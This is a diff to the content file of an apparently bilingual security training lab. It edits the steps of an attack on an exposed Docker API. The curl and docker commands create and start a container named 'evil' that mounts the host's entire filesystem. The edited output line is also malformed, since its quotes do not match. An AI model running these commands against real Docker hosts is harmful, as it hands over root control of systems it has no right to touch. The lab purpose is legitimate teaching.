@@ -137,7 +137,8 @@ export const CONTENT: Record<'en' | 'nl', AppContent> = {
                   command: `# 1. Create Container\ncurl -X POST http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/containers/create?name=evil \\\n  -H "Content-Type: application/json" \\\n  -d '{"Image": "alpine", "Cmd": ["sh"], "Tty": true, "HostConfig": { "Binds": ["/:/host"] }}'\n\n# 2. Start Container\ncurl -X POST http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/containers/evil/start`
                 }
               ],
-              output: `e90e34... (Container ID)`
+              output: `docker -H (localhostIP) run -d --name evil -v /:/host alpine sh'
+`
             },
             {
               label: "2. Verify it is running:",
@@ -150,6 +151,7 @@ export const CONTENT: Record<'en' | 'nl', AppContent> = {
                 {
                   label: "Raw API",
                   command: `curl http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/containers/json | grep evil`
+                  
                 }
               ]
             }
